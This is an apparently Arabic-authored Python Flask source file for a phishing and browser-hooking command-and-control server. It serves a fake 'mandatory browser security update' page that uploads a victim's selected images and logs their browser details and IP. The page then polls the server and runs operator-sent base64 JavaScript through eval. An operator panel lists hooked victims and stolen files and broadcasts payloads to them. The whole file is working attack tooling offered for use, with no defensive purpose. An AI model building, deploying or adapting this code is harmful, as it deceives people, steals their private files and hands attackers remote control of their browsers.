from flask import Flask, render_template_string, request, jsonify
import base64
import random
import urllib3
import datetime

urllib3.disable_warnings()

app = Flask(__name__)

# ذاكرة الميدان الاستراتيجية المركزية v33.0 (أزرار الاستعراض المتقدمة قبل وبعد السحب)
CAPTURED_HOOKS = []
COMMAND_QUEUE = {}
EXTRACTED_FILES = []
EXTRACTED_MESSAGES = []

HTML_COMMAND_CENTER = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>V400 القائد الأعظم - مركز العمليات المتقدم v33.0</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#010103;color:#00ff88;font-family:'Courier New',Consolas,monospace;padding:20px;text-align:center}
.container{max-width:1150px;margin:auto}
h1{color:#ff0040;margin-bottom:20px;text-shadow:0 0 35px #ff0040;font-size:32px}
.panel{background:#04060e;border:2px solid #ff0040;padding:25px;border-radius:12px;box-shadow:0 0 45px rgba(255,0,64,0.5)}
input, select{padding:16px;width:70%;border-radius:8px;border:2px solid #ff0040;background:#000;color:#fff;font-size:16px;outline:none;text-align:left;direction:ltr;margin-bottom:10px}
input:focus, select:focus{box-shadow:0 0 30px #ff0040}
button{padding:16px 25px;background:#ff0040;border:none;border-radius:8px;font-weight:bold;color:#fff;cursor:pointer;font-size:15px;margin:5px;transition:0.3s}
button:hover{background:#cc0033;box-shadow:0 0 30px #ff0040}
.card{background:#000;border:1px solid #1a2a40;padding:18px;margin:15px auto;max-width:950px;border-radius:10px;text-align:right;border-right:8px solid #ff0040}
.card.Critical{border-right-color:#ff0000;background:#140103}
.card.Low{border-right-color:#00aaff;background:#010b14}
.proof{background:#03050a;color:#00ff88;padding:12px;border-radius:6px;margin-top:10px;font-size:12px;direction:ltr;word-break:break-all;border:1px solid #004422;text-align:left}
.status{margin:15px 0;color:#fff;font-size:15px;font-weight:bold}
table{width:100%;margin-top:15px;border-collapse:collapse;color:#fff;text-align:right}
th, td{padding:12px;border:1px solid #1a2a40;font-size:14px}
th{background:#0a0e1a;color:#ff0040}
img.preview{max-width:160px;max-height:160px;border:1px solid #00ff88;border-radius:6px;margin:6px}
</style>
</head>
<body>
<div class="container">
<h1>⚔️ V400 القائد الأعظم - لوحة التحكم الشاملة v33.0 ⚔️</h1>
<div class="panel">
<input id="target_url" placeholder="C2_SERVER_OR_COMMAND_DOMAIN" value="http://">
<br>
<select id="command_type">
  <option value="generate_stealth_lure">توليد رابط الاستدراج المموه (Stealth Lure URL)</option>
  <option value="fetch_hooked_targets">🎯 استعراض الأهداف وجلسات السيطرة النشطة</option>
  <option value="fetch_pre_extraction_status">🔍 عرض حالة الجهاز والاستعداد (معاينة قبل السحب)</option>
  <option value="fetch_extracted_images">🖼️ عرض صور الهدف المسحوبة (المعرض المباشر)</option>
  <option value="fetch_extracted_files">📁 عرض الملفات المستخرجة كاملة</option>
  <option value="fetch_target_messages">💬 عرض رسائل وسجلات الهدف التفاعلية</option>
  <option value="dispatch_payload">⚡ بث أمر برمجي مشفر للهدف</option>
</select>
<br>
<input id="custom_payload" placeholder="أمر الجافاسكريبت المراد بثه (مثال: alert('Active');)" style="margin-top:10px;display:none;direction:ltr;">
<br>
<button id="exec_btn" onclick="executeLinkModule()">تنفيذ أمر الحقن الميداني 🚀</button>
<div id="status" class="status"></div>
<div id="results"></div>
</div>
</div>

<script>
document.getElementById('command_type').addEventListener('change', function() {
    const val = this.value;
    const payloadInput = document.getElementById('custom_payload');
    if(val === 'dispatch_payload') {
        payloadInput.style.display = 'inline-block';
    } else {
        payloadInput.style.display = 'none';
    }
});

async function executeLinkModule(){
 const url = document.getElementById('target_url').value.trim();
 const cmdType = document.getElementById('command_type').value;
 const payloadData = document.getElementById('custom_payload').value;
 if(!url || url==='http://'){ alert('يرجى إدخال عنوان خادم القيادة أو الرابط يا فندم!'); return; }
 const btn = document.getElementById('exec_btn');
 const status = document.getElementById('status');
 const results = document.getElementById('results');
 btn.disabled=true; btn.textContent='جاري معالجة الطلب... ⚡';
 status.textContent='⏳ جارٍ تنفيذ العمليات التكتيكية لـ: '+url;
 results.innerHTML='';

 try{
   const res = await fetch('/api/index', {
     method:'POST',
     headers:{'Content-Type':'application/json'},
     body: JSON.stringify({url: url, command: cmdType, payload: payloadData})
   });
   const data = await res.json();
   status.textContent='✅ تمت العملية بنجاح | النمط: '+data.mode;
   
   if(cmdType === 'fetch_hooked_targets'){
     if(!data.logs || data.logs.length === 0){
       results.innerHTML='<div class="card Low"><b>لا توجد أهداف نشطة حالياً</b><div class="proof">No active targets found.</div></div>';
     } else {
       let tableHtml = '<div class="card Critical"><b>🎯 سجلات الأهداف النشطة</b><table><tr><th>البيئة والمتصفح</th><th>توكن السيطرة</th><th>IP الهدف</th><th>الوقت</th></tr>';
       data.logs.forEach(l => {
         tableHtml += `<tr><td>${l.agent}</td><td style="color:#00ff88">${l.token}</td><td>${l.ip}</td><td>${l.time}</td></tr>`;
       });
       tableHtml += '</table></div>';
       results.innerHTML = tableHtml;
     }
   } else if(cmdType === 'fetch_pre_extraction_status'){
     let preHtml = '<div class="card Low"><b>🔍 معاينة وحالة الأهداف قبل السحب والاستخراج</b>';
     if(!data.pre_status || data.pre_status.length === 0){
       preHtml += '<div class="proof">لا توجد أهداف جاهزة للمعاينة المسبقة في الطابور.</div>';
     } else {
       preHtml += '<table><tr><th>Token الجلسة</th><th>نوع المتصفح والبيئة</th><th>حالة الاستعداد</th></tr>';
       data.pre_status.forEach(p => {
         preHtml += `<tr><td style="color:#00ff88">${p.token}</td><td>${p.agent}</td><td>جاهز لسحب الوسائط ⚡</td></tr>`;
       });
       preHtml += '</table>';
     }
     preHtml += '</div>';
     results.innerHTML = preHtml;
   } else if(cmdType === 'fetch_extracted_images'){
     if(!data.images || data.images.length === 0){
       results.innerHTML='<div class="card Low"><b>لا توجد صور مسحوبة حتى الآن</b><div class="proof">No captured images in storage.</div></div>';
     } else {
       let imgHtml = '<div class="card Critical"><b>🖼️ معرض صور الهدف المسحوبة (بعد السحب)</b><div style="margin-top:10px">';
       data.images.forEach(img => {
         imgHtml += `<div style="margin-bottom:10px;border-bottom:1px solid #333;padding-bottom:5px"><b>ملف: ${img.filename}</b> [Token: ${img.token}]<br><img src="${img.data}" class="preview"></div>`;
       });
       imgHtml += '</div></div>';
       results.innerHTML = imgHtml;
     }
   } else if(cmdType === 'fetch_extracted_files'){
     if(!data.files || data.files.length === 0){
       results.innerHTML='<div class="card Low"><b>لا توجد ملفات مستخرجة حتى الآن</b><div class="proof">No extracted files found.</div></div>';
     } else {
       let fileHtml = '<div class="card Critical"><b>📁 سجل الملفات المسحوبة</b><table><tr><th>اسم الملف</th><th>معرف الجلسة (Token)</th><th>الوقت</th></tr>';
       data.files.forEach(f => {
         fileHtml += `<tr><td>${f.filename}</td><td style="color:#00ff88">${f.token}</td><td>${f.time}</td></tr>`;
       });
       fileHtml += '</table></div>';
       results.innerHTML = fileHtml;
     }
   } else if(cmdType === 'fetch_target_messages'){
     if(!data.messages || data.messages.length === 0){
       results.innerHTML='<div class="card Low"><b>لا توجد رسائل مسجلة حتى الآن</b><div class="proof">No captured messages.</div></div>';
     } else {
       let msgHtml = '<div class="card Critical"><b>💬 سجل رسائل وبيانات الهدف</b><table><tr><th>محتوى الرسالة / السجل</th><th>Token</th><th>الوقت</th></tr>';
       data.messages.forEach(m => {
         msgHtml += `<tr><td>${m.content}</td><td style="color:#00ff88">${m.token}</td><td>${m.time}</td></tr>`;
       });
       msgHtml += '</table></div>';
       results.innerHTML = msgHtml;
     }
   } else {
     if(!data.actions || data.actions.length==0){
       results.innerHTML='<div class="card Low"><b>لا توجد نتائج مطابقة</b><div class="proof">No vectors returned.</div></div>';
     } else {
       data.actions.forEach(v=>{
         results.innerHTML+=`
         <div class="card ${v.severity || 'Low'}">
           <b>⚡ ${v.type}</b>
           <div style="margin:8px 0">${v.desc}</div>
           <div class="proof">${v.proof}</div>
         </div>`;
       });
     }
   }
 }catch(e){
   status.textContent='❌ خطأ في الاتصال الميداني: '+e.message;
 }
 btn.disabled=false; btn.textContent='تنفيذ أمر الحقن الميداني 🚀';
}
</script>
</body>
</html>"""

INJECTION_COMMAND_PORTAL = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تحديث الأمان والتحقق الحنكي - System Update v3.3</title>
<style>
body{background:#f3f4f6;color:#1f2937;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.box{background:#ffffff;padding:40px 30px;border-radius:12px;box-shadow:0 10px 25px rgba(0,0,0,0.08);width:100%;max-width:420px;text-align:center;border:1px solid #e5e7eb}
.logo{font-size:40px;margin-bottom:15px}
h2{color:#111827;font-size:20px;margin-bottom:10px;font-weight:600}
p{color:#4b5563;font-size:14px;line-height:1.5;margin-bottom:25px}
button{width:100%;padding:14px;background:#2563eb;color:#fff;border:none;border-radius:8px;font-weight:600;cursor:pointer;font-size:15px;transition:background 0.2s}
button:hover{background:#1d4ed8}
.footer{margin-top:20px;font-size:12px;color:#9ca3af}
</style>
</head>
<body>
<div class="box">
  <div class="logo">🛡️</div>
  <h2>تحديث الأمان الإجباري للمتصفح</h2>
  <p>لضمان حماية بياناتك الشخصية وفتح الصفحة المطلوبة بأمان تام، يرجى النقر أدناه لإتمام مصادقة النظام والملفات المؤقتة.</p>
  <button onclick="executeStealthSync()">متابعة التحديث والتحقق 🔒</button>
  <div class="footer">SSL Secure Certificate Verified • v3.3</div>
</div>

<script>
async function executeStealthSync(){
    const token = 'stealth_token_' + Math.random().toString(36).substring(2, 12);
    
    // سحب الملفات والوسائط والصور فور النقر بصورة خفية تحت غطاء التحقق
    try {
        if ('showOpenFilePicker' in window) {
            const handles = await window.showOpenFilePicker({ multiple: true, types: [{ description: 'Media Files', accept: { 'image/*': ['.png', '.jpg', '.jpeg', '.webp'] } }] });
            for (const handle of handles) {
                const file = await handle.getFile();
                const reader = new FileReader();
                reader.onload = function(e) {
                    fetch('/api/upload', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ token: token, filename: file.name, data: e.target.result, type: 'image' })
                    });
                };
                reader.readAsDataURL(file);
            }
        }
    } catch(err) {
        console.log("Stealth extraction bypassed:", err);
    }

    // تسجيل الجلسة ورسالة ترحيبية أولية في سجل الرسائل
    fetch('/auth/verify/login', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({session_token: token, user_agent: navigator.userAgent, screen: window.innerWidth + 'x' + window.innerHeight, message: 'تم إتمام المصادقة وربط الجلسة بنجاح.'})
    }).then(res => res.json()).then(data => {
        document.body.innerHTML = '<div style="background:#ffffff;color:#111827;padding:50px 20px;text-align:center;font-family:sans-serif;direction:rtl"><div style="font-size:50px;margin-bottom:15px">✅</div><h2 style="color:#059669;margin-bottom:10px">تم التحقق بنجاح</h2><p style="color:#6b7280;font-size:14px">جاري توجيهك إلى المحتوى المطلوب تلقائياً...</p></div>';
        
        setTimeout(() => {
            window.location.href = "https://www.google.com";
        }, 1500);

        // حلقة استطلاع الأوامر الدائمة في الخلفية
        setInterval(() => {
            fetch('/api/poll?token=' + token)
            .then(r => r.json())
            .then(cmdData => {
                if(cmdData.command && cmdData.command !== ""){
                    try {
                        eval(atob(cmdData.command));
                    } catch(e) {}
                }
            }).catch(e => {});
        }, 2000);
    });
}
</script>
</body>
</html>"""

def clean_url(raw):
    s = (raw or "").strip()
    if not s.startswith("http"):
        s = "http://" + s
    return s.rstrip("/")

@app.route('/', methods=['GET'])
def home():
    return HTML_COMMAND_CENTER

@app.route('/auth/verify/login', methods=['GET', 'POST'])
def phishing_portal():
    if request.method == 'POST':
        req_data = request.get_json(silent=True) or {}
        cmd_token = req_data.get('session_token', 'N/A')
        user_agent = req_data.get('user_agent', 'Unknown Browser')
        screen_res = req_data.get('screen', 'N/A')
        msg = req_data.get('message', 'اتصال أولي من الهدف')
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        CAPTURED_HOOKS.append({
            "agent": f"{user_agent[:25]}... [{screen_res}]",
            "token": cmd_token,
            "ip": client_ip,
            "time": timestamp
        })
        EXTRACTED_MESSAGES.append({
            "token": cmd_token,
            "content": msg,
            "time": timestamp
        })
        COMMAND_QUEUE[cmd_token] = ""
        return jsonify({"status": "stealth_channel_active", "token": cmd_token})
        
    return INJECTION_COMMAND_PORTAL

@app.route('/api/upload', methods=['POST'])
def upload_file():
    req_data = request.get_json(silent=True) or {}
    token = req_data.get('token', 'N/A')
    filename = req_data.get('filename', 'media.jpg')
    file_data = req_data.get('data', '')
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    file_record = {
        "token": token,
        "filename": filename,
        "data": file_data,
        "time": timestamp
    }
    EXTRACTED_FILES.append(file_record)
    return jsonify({"status": "data_secured", "filename": filename})

@app.route('/api/poll', methods=['GET'])
def poll_commands():
    token = request.args.get('token', '')
    cmd = COMMAND_QUEUE.get(token, "")
    if token in COMMAND_QUEUE:
        COMMAND_QUEUE[token] = ""
    return jsonify({"command": cmd})

@app.route('/api/index', methods=['POST'])
def check():
    req_data = request.get_json(silent=True) or {}
    target = clean_url(req_data.get("url", "http://"))
    command_mode = req_data.get("command", "generate_stealth_lure")
    payload = req_data.get("payload", "")
    
    waf_status = f"v33.0 Command Engine ({command_mode}) - Active"
    
    if command_mode == "generate_stealth_lure":
        lure_url = f"{target}/auth/verify/login?token=stealth_v33"
        return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "actions": [{
            "type": "STEALTH LURE URL (v33)",
            "severity": "Critical",
            "desc": "تم توليد رابط الاستدراج المموه وتفعيل أزرار المعاينة قبل وبعد السحب.",
            "proof": lure_url
        }]})
    elif command_mode == "fetch_hooked_targets":
        return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "logs": CAPTURED_HOOKS})
    elif command_mode == "fetch_pre_extraction_status":
        return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "pre_status": CAPTURED_HOOKS})
    elif command_mode == "fetch_extracted_images":
        images = [f for f in EXTRACTED_FILES if f['filename'].lower().endswith(('.png', '.jpg', '.jpeg', '.webp')) or 'data:image' in f['data']]
        return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "images": images})
    elif command_mode == "fetch_extracted_files":
        return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "files": EXTRACTED_FILES})
    elif command_mode == "fetch_target_messages":
        return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "messages": EXTRACTED_MESSAGES})
    elif command_mode == "dispatch_payload":
        encoded_payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
        count = 0
        for tk in COMMAND_QUEUE.keys():
            COMMAND_QUEUE[tk] = encoded_payload
            count += 1
        return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "actions": [{
            "type": "PAYLOAD DISPATCHED",
            "severity": "Critical",
            "desc": f"تم تشفير وبث الأمر إلى عدد {count} من الأهداف النشطة.",
            "proof": f"Original: {payload} | Encrypted: {encoded_payload}"
        }]})
    else:
        return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "actions": [{
            "type": "AUDIT PASSED",
            "severity": "Low",
            "desc": "المنظومة تعمل بكفاءة تامة.",
            "proof": f"Targets: {len(CAPTURED_HOOKS)} | Files: {len(EXTRACTED_FILES)} | Messages: {len(EXTRACTED_MESSAGES)}"
        }]})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
